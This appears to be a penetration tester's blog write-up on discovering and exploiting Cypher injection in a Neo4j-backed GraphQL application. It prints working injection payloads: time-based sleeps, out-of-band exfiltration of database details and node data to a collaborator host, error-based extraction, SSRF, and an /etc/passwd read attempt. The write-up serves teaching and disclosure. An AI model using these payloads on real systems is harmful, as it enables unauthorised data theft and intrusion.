---
title: "Neo4j Injection / Cypher Cypher"
date: 2025-01-30 12:00:00 -500
categories: [SQLi, Neo4j, Cypher, Cypher, Burp, Time Based Payload, Out of Band Payload]
tags:  [SQLi, Neo4j, Cypher, Cypher, Burp, Time Based Payload, Out of Band Payload]
---



Hi everyone,

It’s been a while since I wrote a proper write-up. So recently I came across a class of vulnerability I’d never seen before, even after 10+ years poking at web apps. At first I assumed it was SQL injection, but it wasn’t. It turned out to be **Neo4j** / **Cypher injection**, a thing a lot of people overlook.

In this write-up, I’ll walk you through how I identified and exploited this vulnerability.

---

# Intro:

Let’s start with an introduction: **What is Cypher Injection?**

Neo4j is a popular graph database that uses a query language called Cypher. When improperly handled, user inputs can lead to **Cypher Injection**, allowing attackers to manipulate queries, exfiltrate data, or even execute remote procedures. This write-up explores a real-world Cypher Injection vulnerability discovered in a Neo4j-backed application, detailing the exploitation process, impact, and mitigation strategies.

For more details see: [What is Cypher Injection?](https://neo4j.com/developer/kb/protecting-against-cypher-injection/)

---

# Detection:

During a security assessment, while testing a GraphQL endpoint, I used Burp Suite's Intruder feature to scan specific endpoints.

![](/assets/img/5/1.png)

This is my preferred way of using Burp Suite for active scanning, as sending the request directly to the active scanner would treat the entire query as a single parameter rather than recognizing the nested parameters within it.

I normally use Burp's active scanning when testing applications with many endpoints and parameters, and when automated scanning is authorized during the assessment. Otherwise, I rely solely on manual testing.

After running the scan, Burp flagged a potential SQL injection issue.

![](/assets/img/5/2.png)

However, after trying various SQL injection payloads, none of them worked except for boolean-based ones like `'test' or '1'='1`. Even SQLmap failed to exploit the issue.

![](/assets/img/5/3.png)

At this point, I decided to take a step back and try to identify the type of database management system (DBMS) used by the backend application. Simply by injecting a single quote, I was able to retrieve some details about the backend DBMS:

```txt
"message":"Invalid input ' AND search = ': expected\n  \"!=\"\n  \"%\"\n  \"*\"\n  \"+\"\n  \"-\"\n  \".\"\n  \"/\"\n  \":\"\n  \"<\"\n  \"<=\"\n  \"<>\"\n  \"=\"\n  \"=~\"\n  \">\"\n  \">=\"\n  \"AND\"\n  \"CALL\"\n  \"CONTAINS\"\n  \"CREATE\"\n  \"DELETE\"\n  \"DETACH\"\n  \"ENDS\"\n  \"FOREACH\"\n  \"IN\"\n  \"IS\"\n  \"LOAD\"\n  \"MATCH\"\n  \"MERGE\"\n  \"OPTIONAL\"\n  \"OR\"\n  \"REMOVE\"\n  \"RETURN\"\n  \"SET\"\n  \"STARTS\"\n  \"UNION\"\n  \"UNWIND\"\n  \"USE\"\n  \"WITH\"\n  \"XOR\"\n  \"[\"\n  \"^\"\n  \"}\" (line 15, column 41 (offset: 792))\n\"    WHERE search = 'yes'' AND query_search = 'yes'\"\n    

                             ^"
```

Interesting! Let’s ask ChatGPT what kind of DBMS we’re dealing with.

![](/assets/img/5/4.png)

Neo4j? This was the first time I encountered an issue related to Neo4j. A quick search about Neo4j exploitation techniques led me to a Burp Suite plugin called [Cypher Injection Scanner](https://portswigger.net/bappstore/72f7b61e22f64ef5882dff6054df5ac7). 

Let’s try it and see if it can confirm the issue.

![](/assets/img/5/5.png)

Nice! The plugin confirmed that this is indeed a Cypher injection.

---

# Confirmation:

I wanted to confirm this issue manually and preferably use a PoC demonstrating that I can invoke some of the Neo4j APOC procedures. To achieve this, I decided to use `apoc.util.sleep()` to check if I could force the application to delay its response.

Using the time-based payloads below, it initially didn’t work. However, I noticed that adding a comment at the end of the statement was causing issues. After multiple attempts, I found that adding a backslash made it work.


```
test' OR '1'='1' or party.valid_for_search = 'test' CALL apoc.util.sleep(5) \/\/
```

The response:

![](/assets/img/5/6.png)

Another payload:

```
test' OR '1'='1' or party.valid_for_search = 'test' CALL apoc.util.sleep(25) \/\/
```

The response:

![](/assets/img/5/7.png)


Nice, I have a solid PoC, but let's see if I can extract any data from this Neo4j instance.

---

# Exploitation

## Data Exfiltration

Now, let's try to extract data from this database. I started by gathering details about the Neo4j instance by interacting with `dbms.components()`.  

First, I attempted an out-of-band (OOB) payload, essentially performing an SSRF attack to leak internal data using the following payload:

```
test' OR '1'='1' or party.valid_for_search = 'test' CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM `http://burp.collab.com/?version=' + version + '&name=' + name + '&edition=' + edition as l  \/\/
```

And it worked perfectly. 

![](/assets/img/5/8.png)

However, I then noticed that when using a malformed URL in the `LOAD CSV FROM` instruction or leaving it blank, the app returned an error displaying the output of `dbms.components()` as shown below:


![](/assets/img/5/9.png)


Now, let's read some data. Since Neo4j is not a conventional relational database, it uses **Labels** to categorize nodes, helping to group them based on common properties. Labels are also used to create indexes, constraints, and organize data more efficiently.  

To interact with and retrieve those labels, we need to use the `db.labels()` function. This will help us identify the different labels in the database, which we can then use to query specific node types.

```
test' OR '1'='1' CALL db.labels() YIELD label UNWIND label AS x LOAD CSV FROM x AS b \/\/

```

![](/assets/img/5/10.png)


Then, we can extract data from this label by running a query that matches the nodes associated with that label:

```

test' OR '1'='1' MATCH (f:Party) UNWIND keys(f) as p LOAD CSV FROM toString(f[p]) as l \/\/\

```
![](/assets/img/5/11.png)


The error techniques worked fine, but I noticed it wasn't practical in this situation, as I only got the first element. Since `db.labels()` and its content return a list, it only returned the first element.  

For that reason, I returned to the first technique, using an out-of-band payload, and dumped all the labels and their associated data. This allowed me to gather more comprehensive information from the Neo4j instance.

![](/assets/img/5/12.png)


## SSRF

Uisng the same payload it was possible to perform an SSRF this can be either using the Error based payload:

```
test' OR '1'='1'  LOAD CSV FROM 'http://burp.collab.com' AS x UNWIND x AS y LOAD CSV FROM y AS d \/\/\

```

![](/assets/img/5/13.png)

Or using the Out-of-Band payload:

```
test' OR '1'='1'  LOAD CSV FROM 'http://burp.collab.com' AS x UNWIND x AS y LOAD CSV FROM 'http://burp2.collab2.com/?value+'+y AS d \/\/\

```

![](/assets/img/5/14.png)


Unfortunately, I wasn't able to access any internal resources, such as the AWS metadata, as the app was hosted in a well-isolated environment. This isolation prevented me from exploiting this SSRF to access internal services or metadata.

## LFI


The function `LOAD CSV FROM` can also be used to load internal files using the payload:

```
test' OR '1'='1' LOAD CSV FROM 'file:///etc/passwd' AS x UNWIND x AS y LOAD CSV FROM y AS d //\
```

However, this was not possible as a security protection was in place. My assumption is that the `LOAD CSV` procedure is restricted to only allow file imports from a specific folder (such as an import folder). To configure this restriction, Something like this in the `neo4j.conf`

```
dbms.directories.import=/var/lib/neo4j/import
```

However, what's interesting about Neo4j is that there are many functions to perform different kinds of actions, one of which are `apoc.load.csv`, and `apoc.load.xml` to read the file system. 

Unfortunately, I had the same error when trying these functions, and even after attempting to chain this issue with a path traversal, I still wasn't able to succeed :-(


# End

This concludes the write-up. I hope this provides a clear understanding of how Cypher Injection works and how it can be identified, and exploited. 


---

## References

- [Neo4j Documentation: Protecting Against Cypher Injection](https://neo4j.com/developer/kb/protecting-against-cypher-injection/)
- [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [APOC Library Documentation](https://neo4j.com/labs/apoc/)


